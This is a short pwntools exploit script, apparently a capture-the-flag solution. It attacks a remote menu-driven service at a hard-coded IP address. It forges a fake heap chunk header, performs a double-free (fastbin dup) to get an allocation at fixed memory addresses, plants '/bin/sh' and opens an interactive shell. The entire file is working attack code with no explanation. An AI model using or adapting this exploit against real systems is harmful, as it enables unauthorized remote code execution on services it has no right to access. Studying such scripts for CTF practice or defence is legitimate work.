from pwn import *
p=remote("111.230.240.83", 9999)
 ##name
print p.recvuntil(":")
p.sendline(p64(0x0)+p64(0x51))
print p.recvuntil(">")
 ##
p.sendline("1")
print p.recvuntil(">")
p.sendline("60")
print p.recvuntil(">")
p.sendline("bbbb")
p.recvuntil(">")
 ##
p.sendline("1")
print p.recvuntil(">")
p.sendline("60")
print p.recvuntil(">")
p.sendline("cccc")
print p.recvuntil(">")
 ##
p.sendline("2")
print p.recvuntil(">")
p.sendline("0")
print p.recvuntil(">")

p.sendline("2")
print p.recvuntil(">")
p.sendline("1")
print p.recvuntil(">")

p.sendline("2")
print p.recvuntil(">")
p.sendline("0")
print p.recvuntil(">")
##0
p.sendline("1")
print p.recvuntil(">")
p.sendline("60")
print p.recvuntil(">")
p.sendline(p64(0x0000000000602060)+p64(0x0000000000603010))
print p.recvuntil(">")
##1
p.sendline("1")
print p.recvuntil(">")
p.sendline("60")
print p.recvuntil(">")
p.sendline("aaaaa")
print p.recvuntil(">")
##0
p.sendline("1")
print p.recvuntil(">")
p.sendline("60")
print p.recvuntil(">")
p.sendline("dddddd")
print p.recvuntil(">")
##dsa
p.sendline("1")
print p.recvuntil(">")
p.sendline("60")
print "*"*24
print p.recvline()
p.sendline("a"*16+"/bin/sh")
print p.recvuntil(">")

p.sendline("3")
#print p.recvuntil(">")
print p.recvline(keepends=True)

p.interactive()
